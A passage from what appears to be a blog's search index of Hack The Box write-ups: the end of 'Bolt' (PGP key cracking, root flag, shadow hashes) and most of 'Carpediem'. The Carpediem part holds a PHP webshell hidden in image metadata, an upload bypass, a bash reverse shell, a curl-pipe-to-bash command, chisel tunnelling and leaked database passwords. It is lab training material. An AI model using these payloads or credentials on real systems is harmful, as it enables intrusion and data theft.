JAwizGF9kkXhP\\\\r\\\\nleD/IYg69kTvFfuw7JHkqkQF3cBf3zoSykZzrWNW6Kx2CxFowDd/a3yB4moU\\\\r\\\\nKP9sBvplPPBrSAQmqukQoH1iGmqWhGAckSS/WpaPSEOG3K5lcpt5EneFC64f\\\\r\\\\na6yNKT1Z649ihWOv+vpOEftJVjOvruyblhl5QMNUPnvGADHdjZ9SRmo+su67\\\\r\\\\nJAKMm0cf1opW9x+CMMbZpK9m3QMyXtKyEkYP5w3EDMYdM83vExb0DvbUEVFH\\\\r\\\\nkERD10SVfII2e43HFgU+wXwYR6cDSNaNFdwbybXQ0quQuUQtUwOH7t/Kz99+\\\\r\\\\nJa9e91nDa3oLabiqWqKnGPg+ky0oEbTKDQZ7Uy66tugaH3H7tEUXUbizA6cT\\\\r\\\\nGh4htPq0vh6EJGCPtnyntBdSryYPuwuLI5WrOKT+0eUWkMA5NzJwHbJMVAlB\\\\r\\\\nGquB8QmrJA2QST4v+/xnMLFpKWtPVifHxV4zgaUF1CAQ67OpfK/YSW+nqong\\\\r\\\\ncVwHHy2W6hVdr1U+fXq9XsGkPwoIJiRUC5DnCg1bYJobSJUxqXvRm+3Z1wXO\\\\r\\\\nn0LJKVoiPuZr/C0gDkek/i+p864FeN6oHNxLVLffrhr77f2aMQ4hnSsJYzuz\\\\r\\\\n4sOO1YdK7/88KWj2QwlgDoRhj26sqD8GA/PtvN0lvInYT93YRqa2e9o7gInT\\\\r\\\\n4JoYntujlyG2oZPLZ7tafbSEK4WRHx3YQswkZeEyLAnSP6R2Lo2jptleIV8h\\\\r\\\\nJ6V/kusDdyek7yhT1dXVkZZQSeCUUcQXO4ocMQDcj6kDLW58tV/WQKJ3duRt\\\\r\\\\n1VrD5poP49+OynR55rXtzi7skOM+0o2tcqy3JppM3egvYvXlpzXggC5b1NvS\\\\r\\\\nUCUqIkrGQRr7VTk/jwkbFt1zuWp5s8zEGV7aXbNI4cSKDsowGuTFb7cBCDGU\\\\r\\\\nNsw+14+EGQp5TrvCwHYEGAEIAAkFAmA4G2ECGwwAIQkQHCdBo9w7Sr0WIQTf\\\\r\\\\nQmvHpKivWOUO2g4cJ0Gj3DtKvf4dB/9CGuPrOfIaQtuP25S/RLVDl8XHvzPm\\\\r\\\\noRdF7iu8ULcA9gTxPn8DNbtdZEnFHHOANAHnIFGgYS4vj3Dj9Q3CEZSSVvwg\\\\r\\\\n6599FMcw9nGzypVOgqgQv8JGmIUeCipD10k8nHW7m9YBfQB04y9wJw99WNw/\\\\r\\\\nIc3vdhZ6NvsmLzYI21dnWD287sPj2tKAuhI0AqCEkiRwb4Z4CSGgJ5TgGML8\\\\r\\\\n11Izrkqamzpc6mKBGi213tYH6xel3nDJv5TKm3AGwXsAhJjJw+9K0MNARKCm\\\\r\\\\nYZFGLdtA/qMajW4/+T3DJ79YwPQOtCrFyHiWoIOTWfs4UhiUJIE4dTSsT/W0\\\\r\\\\nPSwYYWlAywj5\\\\r\\\\n=cqxZ\\\\r\\\\n-----END PGP PRIVATE KEY BLOCK-----\\\\r\\\\n\\\",\\\"keyId\\\":\\\"dc3b4abd\\\",\\\"userIds\\\":[{\\\"name\\\":\\\"Eddie Johnson\\\",\\\"email\\\":\\\"eddie@bolt.htb\\\"}],\\\"fingerprint\\\":\\\"df426bc7a4a8af58e50eda0e1c2741a3dc3b4abd\\\",\\\"created\\\":\\\"Thu Feb 25 2021 14:49:21 GMT-0700 (Mountain Standard Time)\\\",\\\"expires\\\":\\\"Never\\\",\\\"algorithm\\\":\\\"rsa_encrypt_sign\\\",\\\"length\\\":2048,\\\"private\\\":true,\\\"user_id\\\":\\\"MY_KEY_ID\\\"}}\",\n   \"passbolt-public-gpgkeys\":\"{\\\"ba192ac8-99c0-3c89-a36f-a6094f5b9391\\\":{\\\"key\\\":\\\"-----BEGIN PGP PUBLIC KEY BLOCK-----\\\\r\\\\nVersion: OpenPGP.js v4.10.9\\\\r\\\\nComment: https://openpgpjs.org\\\\r\\\\n\\\\r\\\\nxsDNBGA2peUBDADHDueSrCzcZBMgt9GzuI4x57F0Pw922++n/vQ5rQs0A3Cm\\\\r\\\\nof6BH+H3sJkXIVlvLF4pygGyYndMMQT3NxZ84q32dPp2DKDipD8gA4ep9RAT\\\\r\\\\nIC4seXLUSTgRlxjB//NZNrAv35cHjb8f2hutHGYdigUUjB7SGzkjHtd7Ixbk\\\\r\\\\nLxxRta8tp9nLkqhrPkGCZRhJQPoolQQec2HduK417aBXHRxOLi6Loo2DXPRm\\\\r\\\\nDAqqYIhP9Nkhy27wL1zz57Fi0nyPBWTqA/WAEbx+ud575cJKHM7riAaLaK0s\\\\r\\\\nhuN12qJ7vEALjWY2CppEr04PLgQ5pj48Asly4mfcpzztP2NdQfZrFHe/JYwH\\\\r\\\\nI0zLDA4ZH4E/NK7HhPWovpF5JNK10tI16hTmzkK0mZVs8rINuB1b0uB0u3FP\\\\r\\\\n4oXfBuo6V5HEhZQ/H+YKyxG8A3xNsMTW4sy+JOw3EnJQT3O4S/ZR14+42nNt\\\\r\\\\nP+PbpxTgChS0YoLkRmYVikfFZeMgWl2L8MyqbXhvQlKb/PMAEQEAAc0kUGFz\\\\r\\\\nc2JvbHQgU2VydmVyIEtleSA8YWRtaW5AYm9sdC5odGI+wsElBBMBCgA4FiEE\\\\r\\\\nWYYKJp6AP6CUQWdTq44u+1ahbIQFAmA2peUCGwMFCwkIBwIGFQoJCAsCBBYC\\\\r\\\\nAwECHgECF4AAIQkQq44u+1ahbIQWIQRZhgomnoA/oJRBZ1Orji77VqFshPZa\\\\r\\\\nDACcb7OIZ5YTrRCeMrB/QRXwiS8p1SBHWZbzCwVTdryTH+9d2qKuk9cUF90I\\\\r\\\\ngTDNDwgWhcR+NAcHvXVdp3oVs4ppR3+RrGwA0YqVUuRogyKzVvtZKWBgwnJj\\\\r\\\\nULJiBG2OkxXzrY9N/4hCHJMliI9L4yjf0gOeNqQa9fVPk8C73ctKglu75ufe\\\\r\\\\nxTLxHuQc021HMWmQt+IDanaAY6aEKF0b1L49XuLe3rWpWXmovAc6YuJBkpGg\\\\r\\\\na/un/1IAk4Ifw1+fgBoGSQEaucgzSxy8XimUjv9MVNX01P/C9eU/149QW5r4\\\\r\\\\naNtabc2S8/TDDVEzAUzgwLHihQyzetS4+Qw9tbAQJeC6grfKRMSt3LCx1sX4\\\\r\\\\nP0jFHFPVLXAOtOiCUAK572iD2lyJdDsLs1dj4H/Ix2AV/UZe/G0qpN9oo/I+\\\\r\\\\nvC86HzDdK2bPu5gMHzZDI30vBCZR+S68sZSBefpjWeLWaGdtfdfK0/hYnDIP\\\\r\\\\neTLXDwBpLFklKpyi2HwnHYwB7YX/RiWgBffOwM0EYDal5QEMAJJNskp8LuSU\\\\r\\\\n3YocqmdLi9jGBVoSSzLLpeGt5HifVxToToovv1xP5Yl7MfqPdVkqCIbABNnm\\\\r\\\\noIMj7mYpjXfp659FGzzV0Ilr0MwK0sFFllVsH6beaScKIHCQniAjfTqCMuIb\\\\r\\\\n3otbqxakRndrFI1MNHURHMpp9gc2giY8Y8OsjAfkLeTHgQbBs9SqVbQYK0d1\\\\r\\\\njTKfAgYRkjzvp6mbLMaMA3zE9joa+R0XFFZlbcDR1tBPkj9eGK0OM1SMkU/p\\\\r\\\\nxTx6gyZdVYfV10n41SJMUF/Nir5tN1fwgbhSoMTSCm6zuowNU70+VlMx4TuZ\\\\r\\\\nRkXI2No3mEFzkw1sg/U3xH5ZlU/BioNhizJefn28kmF+801lBDMCsiRpW1i8\\\\r\\\\ncnr5U2D5QUzdj8I1G8xkoC6S6GryOeccJwQkwI9SFtaDQQQLI0b3F6wV32fE\\\\r\\\\n21nq2dek7/hocGpoxIYwOJRkpkw9tK2g8betT4OjHmVkiPnoyWo9do8g0Bzd\\\\r\\\\nNBUlP7GHXM/t605MdK9ZMQARAQABwsENBBgBCgAgFiEEWYYKJp6AP6CUQWdT\\\\r\\\\nq44u+1ahbIQFAmA2peUCGwwAIQkQq44u+1ahbIQWIQRZhgomnoA/oJRBZ1Or\\\\r\\\\nji77VqFshCbkC/9mKoWGFEGCbgdMX3+yiEKHscumFvmd1BABdc+BLZ8RS2D4\\\\r\\\\ndvShUdw+gf3m0Y9O16oQ/a2kDQywWDBC9kp3ByuRsphu7WnvVSh5PM0quwCK\\\\r\\\\nHmO+DwPJyw7Ji+ESRRCyPIIZImZrPYyBsJtmVVpjq323yEuWBB1l5NyflL5I\\\\r\\\\nLs9kncyEc7wNb5p1PEsui/Xv7N5HRocp1ni1w5k66BjKwMGnc48+x1nGPaP0\\\\r\\\\n4LYAjomyQpRLxFucKtx8UTa26bWWe59BSMGjND8cGdi3FiWBPmaSzp4+E1r0\\\\r\\\\nAJ2SHGJEZJXIeyASrWbvXMByxrVGgXBR6NHfl5e9rGDZcwo0R8LbbuACf7/F\\\\r\\\\nsRIKSwmIaLpmsTgEW9d8FdjM6Enm7nCObJnQOpzzGbHbIMxySaCso/eZDX3D\\\\r\\\\nR50E9IFLqf+Au+2UTUhlloPnIEcp7xV75txkLm6YUAhMUyLn51pGsQloUZ6L\\\\r\\\\nZ8gbvveCudfCIYF8cZzZbCB3vlVkPOBSl6GwOg9FHAVS0jY=\\\\r\\\\n=FBUR\\\\r\\\\n-----END PGP PUBLIC KEY BLOCK-----\\\\r\\\\n\\\",\\\"keyId\\\":\\\"56a16c84\\\",\\\"userIds\\\":[{\\\"name\\\":\\\"Passbolt Server Key\\\",\\\"email\\\":\\\"admin@bolt.htb\\\"}],\\\"fingerprint\\\":\\\"59860a269e803fa094416753ab8e2efb56a16c84\\\",\\\"created\\\":\\\"Wed Feb 24 2021 12:15:49 GMT-0700 (Mountain Standard Time)\\\",\\\"expires\\\":\\\"Never\\\",\\\"algorithm\\\":\\\"rsa_encrypt_sign\\\",\\\"length\\\":3072,\\\"private\\\":false,\\\"user_id\\\":\\\"ba192ac8-99c0-3c89-a36f-a6094f5b9391\\\"},\\\"4e184ee6-e436-47fb-91c9-dccb57f250bc\\\":{\\\"key\\\":\\\"-----BEGIN PGP PUBLIC KEY BLOCK-----\\\\r\\\\nVersion: OpenPGP.js v4.10.9\\\\r\\\\nComment: https://openpgpjs.org\\\\r\\\\n\\\\r\\\\nxsBNBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi\\\\r\\\\nfjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk\\\\r\\\\ncpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU\\\\r\\\\nRNa6PCvADh22J5vD+/RjPrmpnHcUuj+/qtJrS6PyEhY6jgxmeijYZqGkGeWU\\\\r\\\\n+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a\\\\r\\\\nIf70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB\\\\r\\\\nAAHNHkVkZGllIEpvaG5zb24gPGVkZGllQGJvbHQuaHRiPsLAjQQQAQgAIAUC\\\\r\\\\nYDgbYQYLCQcIAwIEFQgKAgQWAgEAAhkBAhsDAh4BACEJEBwnQaPcO0q9FiEE\\\\r\\\\n30Jrx6Sor1jlDtoOHCdBo9w7Sr35DQf9HZOFYE3yug2TuEJY7q9QfwNrWhfJ\\\\r\\\\nHmOwdM1kCKV5XnBic356DF/ViT3+pcWfIbWT8giYIZ/2qYfAd74S+gMKBim8\\\\r\\\\nwBAH0J7WcnUI+py/zXxapGxBF0ufJtqrHmPaKsNaQVCEV3dDzTqlVRi0vfOD\\\\r\\\\nCm6kt3E8f8GPYK9Mh21gPjnhoPE1s23NzmBUiDt6wjZ2dOQ2cVagVnf6PyHM\\\\r\\\\nWZLqUm8nQY342t3+AA6SFTw/YpwPPvjtZBBHf95BrSbpCE5Bjar9UyB+14x6\\\\r\\\\nOUcWhkJu7QgySrCwAg2aKIBzsfWovcVTe9Rkpq/ty1tYOklT9kn75D9ttDF4\\\\r\\\\nU8+Qz61kTICf987ATQRgOBthAQgAmlgcw3DqVzEBa5k9djPsUTJWOKVY5uox\\\\r\\\\noBp6X0H9njR9Ufb2XtmxZUUdV/uhtbnM0lSlNkeNNBX4c/Qny88vfkgb66xc\\\\r\\\\noOo4q+fNCEZfCmcS2AwMsUlzaPDQjowp4V+mWSc8JXq4GXOd/mrooibtiEdt\\\\r\\\\nvK4pzMdvwGCykFqugyRDLksc1hfDYU+s5R42TNiMdW7OwYAplnOjgExOH8f1\\\\r\\\\nlXVkqbsq5p54TbHe+0SdlfH5pJf4Gfwqj6dQlkSf3DMeEnByxEZX3imeKGrC\\\\r\\\\nUmwLN4NHMeUs5EXuLnufut9aTMhbw/tetTtUXTHFk/zc7EhZDR1d3mkDV83c\\\\r\\\\ntEUh6BuElwARAQABwsB2BBgBCAAJBQJgOBthAhsMACEJEBwnQaPcO0q9FiEE\\\\r\\\\n30Jrx6Sor1jlDtoOHCdBo9w7Sr3+HQf/Qhrj6znyGkLbj9uUv0S1Q5fFx78z\\\\r\\\\n5qEXRe4rvFC3APYE8T5/AzW7XWRJxRxzgDQB5yBRoGEuL49w4/UNwhGUklb8\\\\r\\\\nIOuffRTHMPZxs8qVToKoEL/CRpiFHgoqQ9dJPJx1u5vWAX0AdOMvcCcPfVjc\\\\r\\\\nPyHN73YWejb7Ji82CNtXZ1g9vO7D49rSgLoSNAKghJIkcG+GeAkhoCeU4BjC\\\\r\\\\n/NdSM65Kmps6XOpigRottd7WB+sXpd5wyb+UyptwBsF7AISYycPvStDDQESg\\\\r\\\\npmGRRi3bQP6jGo1uP/k9wye/WMD0DrQqxch4lqCDk1n7OFIYlCSBOHU0rE/1\\\\r\\\\ntD0sGGFpQMsI+Q==\\\\r\\\\n=+pbw\\\\r\\\\n-----END PGP PUBLIC KEY BLOCK-----\\\\r\\\\n\\\",\\\"keyId\\\":\\\"dc3b4abd\\\",\\\"userIds\\\":[{\\\"name\\\":\\\"Eddie Johnson\\\",\\\"email\\\":\\\"eddie@bolt.htb\\\"}],\\\"fingerprint\\\":\\\"df426bc7a4a8af58e50eda0e1c2741a3dc3b4abd\\\",\\\"created\\\":\\\"Thu Feb 25 2021 14:49:21 GMT-0700 (Mountain Standard Time)\\\",\\\"expires\\\":\\\"Never\\\",\\\"algorithm\\\":\\\"rsa_encrypt_sign\\\",\\\"length\\\":2048,\\\"private\\\":false,\\\"user_id\\\":\\\"4e184ee6-e436-47fb-91c9-dccb57f250bc\\\"}}\"\n}\nThe first private key have some invalid characters, so lets export the last one, format it correctly and write it to a file, eddie-private.asc.\n┌──(void㉿void)-[/htb/bolt]\n└─$ sed -i 's/\\\\\\\\r/\\n/g' eddie-private.asc && sed -i 's/\\\\\\\\n//g' eddie-private.asc\nLoading the Private PGP in the revocery page forwards us to the next step where we are prompted to enter the passphrase. Trying all three previously recovered passwords give nothing however.\n![[Pasted image 20211112105222.png]]\n\n\n\nStep 3\nCrack the Private PGP!\n┌──(void㉿void)-[/htb/bolt]\n└─$ gpg2john eddie-private.asc &gt; eddie-private.hash                   \n\nFile eddie-private.asc\n\n┌──(void㉿void)-[/htb/bolt]\n└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=gpg eddie-private.hash                                                                   \nUsing default input encoding: UTF-8\nLoaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])\n\n[...snip...]\n\nmerrychristmas   (Eddie Johnson)\n1g 0:00:06:38 DONE (2021-11-12 11:08) 0.002507g/s 107.4p/s 107.4c/s 107.4C/s mhines..menudo\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\nWith the cracked password we are now able to access the passbolt app and can view the password for the application root user (Z(2rmxsNW(Z?3=p/9s).\n![[Pasted image 20211112111055.png]]\nEscalate to root, and grab the flag.\nPassword: \nroot@bolt:/home/eddie# cat /root/root.txt\n182bf942f16b38f705a6375aafd98fa7\nroot@bolt:/home/eddie# cat /etc/shadow\nroot:$6$gID7DRyUwzMW69Ul$209oMxMiaHmg1iiIbvO0z7Z7Twe./PKnGZKede1XYfsqynZ/xLN5jAmtwMLFWpFLeV6vf8YSVsj87Q5zkbudX.:18879:0:99999:7:::\neddie:$6$hr9Mpb1gVh69X761$BBw9u5yqbhdMyhic/GDq.aRHBErqOw7d/uYrNOnzOtgBoiXz4HSdU1l2jzRxSa6PJMiNSQ6cGx1YtIUtqXboo/:18692:0:99999:7:::\nclark:$6$W85bOWcfI3balSJ3$tT0hU4y9FeMhu9nlu8CRFt9RiQwO0VEWqA3oVNJWbR63/lO3YJIN1lKe5UdxrencyWBvbClv2LwqGtW6ZeDuk1:18683:0:99999:7:::\n\n\n\n\nReferences\ndocker: https://docs.docker.com/engine/reference/commandline/load/ https://www.educba.com/docker-import/\nssti: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection https://0xdf.gitlab.io/2019/01/12/htb-oz.html https://jayaye15.medium.com/jinja2-server-side-template-injection-ssti-9e209a6bbdf6\npassbolt recovery: https://community.passbolt.com/t/passbolt-self-hosted-does-not-send-password-recovery-email-only-from-administrator/3625"
  },
  {
    "objectID": "posts/2022-09-14-htb-writeup-carpediem/2022-09-14-htb-writeup-carpediem.html",
    "href": "posts/2022-09-14-htb-writeup-carpediem/2022-09-14-htb-writeup-carpediem.html",
    "title": "Carpediem - Hack The Box",
    "section": "",
    "text": "USER\n\nStep 1 - Poking around on port 80\n➜  carpediem nmap -Pn -n -p- 10.10.11.167\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\n\n➜  carpediem nmap -Pn -n -p22,80 -sCV 10.10.11.167\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 96:21:76:f7:2d:c5:f0:4e:e0:a8:df:b4:d9:5e:45:26 (RSA)\n|   256 b1:6d:e3:fa:da:10:b9:7b:9e:57:53:5c:5b:b7:60:06 (ECDSA)\n|_  256 6a:16:96:d8:05:29:d5:90:bf:6b:2a:09:32:dc:36:4f (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Comming Soon\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n➜  webanalyze ./webanalyze -host http://10.10.11.167\nhttp://10.10.11.167 (0.2s):\n    Bootstrap,  (UI frameworks)\n    Google Font API,  (Font scripts)\n    Ubuntu,  (Operating systems)\n    Nginx, 1.18.0 (Web servers, Reverse proxies)\nVisiting http://10.10.11.167 we find the domain carpediem.htb and a release count down, similar to the box Player. \nLooking for vhosts we find portal.carpediem.htb:\n➜  carpediem ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://carpediem.htb -H \"Host: FUZZ.carpediem.htb\" -fs 2875\nportal                  [Status: 200, Size: 31090, Words: 7687, Lines: 463, Duration: 104ms]\nhttp://portal.carpediem.htb is a unexpected motorcycle shop. \nLooking around on the portal page we have a lot of parameters to fuzz, starting with search I find nothing. Next moving on to ?p= I’m able to create a loop which will exhaust the memory revealing the directory location: \nTesting any other of the found parameters, example uploads, we get this message:\nWarning: include(uploads/index.php): failed to open stream: No such file or directory in /var/www/html/portal/index.php on line 14\n\nWarning: include(): Failed opening 'uploads/index.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/portal/index.php on line 14\nI’m unable to do anything of use with this information, so lets move on.\n➜  carpediem ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://portal.carpediem.htb/FUZZ/\n.htaccess               [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 71ms]\n.htpasswd               [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 75ms]\nadmin                   [Status: 200, Size: 27834, Words: 7052, Lines: 567, Duration: 89ms]\nassets                  [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 63ms]\nbuild                   [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 66ms]\nclasses                 [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 55ms]\ndist                    [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 64ms]\nicons                   [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 65ms]\ninc                     [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 65ms]\nlibs                    [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 63ms]\nplugins                 [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 41ms]\nserver-status           [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 68ms]\nuploads                 [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 63ms]\nBrowsing to /admin we get a alert saying Access Denied!, trying to register a user account and testing again result in the same thing.\nPlaying around with the register function we can confirm that there is a user called admin: \nWe’re able to break the SQL syntax by entering username 'ORDER BY 1--: \nSave the request to a file and fire up sqlmap to do the heavy lifting for you.\n➜  carpediem sqlmap -r register.req -p username\n[... snip ...]\n[12:35:21] [INFO] POST parameter 'username' is 'MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable\nsqlmap identified the following injection point(s) with a total of 996 HTTP(s) requests:\n---\nParameter: username (POST)\n    Type: error-based\n    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)\n    Payload: firstname=asdf&lastname=asdf&contact=asdf&gender=Male&address=asdf&username=injectpls'||(SELECT 0x62626476 WHERE 4087=4087 AND GTID_SUBSET(CONCAT(0x7178627671,(SELECT (ELT(5583=5583,1))),0x71707a7a71),5583))||'&password=asdf\n---\n[12:35:35] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: PHP 7.4.25, Nginx 1.18.0\nback-end DBMS: MySQL &gt;= 5.6\n\n➜  carpediem sqlmap -r register.req -p username --dbs\navailable databases [1]:\n[*] portal\nSadly it stops there, we’re unable to fetch tables and/or columns. I tried a lot of different common combinations such as table users and columns username,password but nothing. It looks like this might be a rabbit hole. Moving on to the next form, we can edit our user under http://portal.carpediem.htb/?p=edit_account.\nDoing a edit, we can see a new interesting parameter in Burp - login_type=2. Changing this to 1 and we’re now able to access /admin \n\n\n\nStep 2 - Find the vuln\nGoing through the admin panel the options are slim, at first glance it looks like we have a lot of options but in reality they’ve removed all the update/save buttons only giving access to few functions.\n(1) We can create a new bike with text + image\n(2) Edit previously created bikes\n(3) Print a Booking Report PDF\n(4) Edit our user profile and add avatar image\nLooking on bookings we find 5 entries, and from the data a new name: jhammond@carpediem.htb. Going to edit user profile I try to upload a malicious jpg containing php code, but this does nothing.\nWe can bypass this by simply capturing the request in burp and removing .jpg from the request body, and the file will be uploaded as a .php.\n➜  carpediem exiftool -DocumentName=\"&lt;h1&gt;0xPThree - exploit.se\n&lt;?php if(isset(\\$_REQUEST['cmd'])){echo '&lt;pre&gt;';\\$cmd = (\\$_REQUEST['cmd']);system(\\$cmd);echo '&lt;/pre&gt;';} __halt_compiler();?&gt;&lt;/h1&gt;\" exploit.jpg \n    1 image files updated\n➜  carpediem mv exploit.jpg exploit.php.jpg\nFrom Burp intercept change filename:\n\nAnd our avatar should now be broken by the webshell.\n\nRight-click the image, open in new tab, and start to enumerate the box and/or setup a reverse shell.\n\nThe uploaded php file is removed after a few minutes, so create a simple reverse shell:\n➜  carpediem echo \"bash -i &gt;& /dev/tcp/10.10.14.10/4488 0&gt;&1\" &gt; rev.sh\n➜  carpediem chmod +x rev.sh \n➜  carpediem python3 -m http.server 80\n\n## Do a GET request to run 'rev.sh'\nGET /uploads/1662983460_exploit.php?cmd=curl%20http://10.10.14.10/rev.sh|bash\n\n➜  carpediem nc -lvnp 4488\nlistening on [any] 4488 ...\nconnect to [10.10.14.10] from (UNKNOWN) [10.10.11.167] 46968\nbash: cannot set terminal process group (1): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@3c371615b7aa:/var/www/html/portal/uploads$ id && hostname\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n3c371615b7aa\n\n\nStep 3 - MySQL\nEnumerate the victim machine and we can start by looking for SQL credentials.\nwww-data@3c371615b7aa:/var/www/html/portal/classes$ cat DBConnection.php\n&lt;?php\nif(!defined('DB_SERVER')){\n    require_once(\"../initialize.php\");\n}\nclass DBConnection{\n\n    private $host = 'mysql';\n    private $username = 'portaldb';\n    private $password = 'J5tnqsXpyzkK4XNt';\n    private $database = 'portal';\nLooking around further we can see we’re in a container. Upload deepce.sh to enumerate and it gives little to no info..\nwww-data@3c371615b7aa:/dev/shm$ bash deepce.sh\n[... snip ...]\n[+] Inside Container ........ Yes\n[+] Container Platform ...... docker\n[+] Container tools ......... None\n[+] Docker Version .......... Version Unknown\n[+] Dangerous Capabilities .. Unknown (capsh not installed)\n[+] Privileged Mode ......... Unknown\n[+] Useful tools installed .. Yes\n/usr/bin/curl\n/usr/bin/wget\n/usr/bin/gcc\n/bin/hostname\n/usr/bin/python3\nIn env we find additional credentials:\nwww-data@3c371615b7aa:/$ ./usr/bin/env\nMYSQL_PORT_33060_TCP_ADDR=172.17.0.3\nMYSQL_PORT=tcp://172.17.0.3:3306\nMYSQL_PORT_3306_TCP_ADDR=172.17.0.3\nMYSQL_NAME=/portal/mysql\nMYSQL_ENV_MYSQL_ROOT_PASSWORD=3dQXeqjMHnq4kqDv\nMYSQL_PORT_3306_TCP_PORT=3306\nUpload chisel to the docker and setup a tunnel so we can use proxychains and reach 172.17.0.3:3306 Note that I wasn’t able to execute the binary in /dev/shm and had to move to /tmp\n## Setup chisel server locally\n➜  carpediem cat /etc/proxychains4.conf\n[... snip ...]\nsocks5  127.0.0.1 5000\n➜  chisel_1.7.7 ./chisel_1.7.7_linux_amd64 server -p 4444 --reverse\n\n## Connect with chisel client from victim\nwww-data@3c371615b7aa:/dev/shm$ wget http://10.10.14.10/chisel_1.7.7_linux_amd64\nwww-data@3c371615b7aa:/dev/shm$ chmod +x chisel_1.7.7_linux_amd64\nwww-data@3c371615b7aa:/tmp$ ./chisel_1.7.7_linux_amd64 client 10.10.14.10:4444 R:5000:socks\n\n## Verify connection with nmap\n➜  carpediem proxychains nmap -sT --top-port 25 --open 172.17.0.3\n[... snip ...]\nPORT     STATE SERVICE\n3306/tcp open  mysql\nLogin to the MySQL database and try to extract valuable information:\n➜  carpediem proxychains mysql -h 172.17.0.3 -D portal -u portaldb -p\nEnter password: J5tnqsXpyzkK4XNt\n\nMySQL [portal]&gt; show tables;\n+------------------+\n| Tables_in_portal |\n+------------------+\n| bike_list        |\n| brand_list       |\n| categories       |\n| file_list        |\n| rent_list        |\n| system_info      |\n| users            |\n+------------------+\n\nMySQL [portal]&gt; select * from users where username = 'admin';\n+----+-----------+----------+--------+------------------------+----------+----------------------------------+---------+-----------------------------------+------------+------------+---------------------+---------------------+\n| id | firstname | lastname | gender | contact                | username | password                         | address | avatar                            | last_login | login_type | date_added          | date_updated        |\n+----+-----------+----------+--------+------------------------+----------+----------------------------------+---------+-----------------------------------+------------+------------+---------------------+---------------------+\n|  1 | Jeremy    | Hammond  | Male   | jhammond@carpediem.htb | admin    | b723e511b084ab84b44235d82da572f3 |         | uploads/1635793020_HONDA_XADV.png | NULL       |          1 | 2021-01-20 14:02:37 | 2022-04-01 23:34:50 |\n+----+-----------+----------+--------+------------------------+----------+----------------------------------+---------+-----------------------------------+------------+------------+---------------------+---------------------+\nUnfortunately we’re not able to crack the hash using hashcat.\nLets test the other set of credentials found in /usr/bin/env, we don’t have a username so I’m guessing it’s default root:\n➜  carpediem proxychains mysql -h 172.17.0.3 -P 3306 -u root -p\nEnter password: 3dQXeqjMHnq4kqDv\n\nMySQL [(none)]&gt; show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| mysql              |\n| performance_schema |\n| portal             |\n| sys                |\n+--------------------+\nWe find the same set of databases, so there’s really no need to continue enumerating here.\n\n\nStep 4 - Enumerate Docker network\nContinue to enumerate the surrounding docker addresses for any more hints.\n172.17.0.2:\n➜  carpediem proxychains nmap -sT --top-port=200 --open 172.17.0.2\nPORT    STATE SERVICE\n21/tcp  open  ftp\n80/tcp  open  http\n443/tcp open  https\nTrying to access the FTP server we’re able to login with anonymous:anonymous but we can’t list any content:\n➜  carpediem proxychains ftp 172.17.0.2\nftp&gt; dir\n500 Illegal PORT command.\n\nftp&gt; pass\nPassive mode: on; fallback to active mode: on.\n\nftp&gt; dir\n227 Entering Passive Mode (172,17,0,2,31,233).\n[proxychains] Strict chain  ...  127.0.0.1:5000  ...  172.17.0.2:8169  ...  OK\n150 Here comes the directory listing.\n172.17.0.4:\n➜  carpediem proxychains nmap -sT --open 172.17.0.4\nN/A\n\n➜  carpediem proxychains nmap -sT --top-port=5000 --open 172.17.0.4\nPORT      STATE SERVICE\n27017/tcp open  mongod\n➜  carpediem proxychains mongo 172.17.0.4 \n&gt; show databases;\nadmin    0.000GB\nconfig   0.000GB\nlocal    0.000GB\ntrudesk  0.001GB\n\n&gt; use trudesk;\nswitched to db trudesk\n\n&gt; show tables;\naccounts\ncounters\ndepartments\ngroups\nmessages\nnotifications\npriorities\nrole_order\nroles\nsessions\nsettings\ntags\nteams\ntemplates\ntickets\ntickettypes\n\n&gt; db.accounts.find()\n{ \"_id\" : ObjectId(\"623c8b20855cc5001a8ba13c\"), \"preferences\" : { \"tourCompleted\" : false, \"autoRefreshTicketGrid\" : true, \"openChatWindows\" : [ ] }, \"hasL2Auth\" : false, \"deleted\" : false, \"username\" : \"admin\", \"password\" : 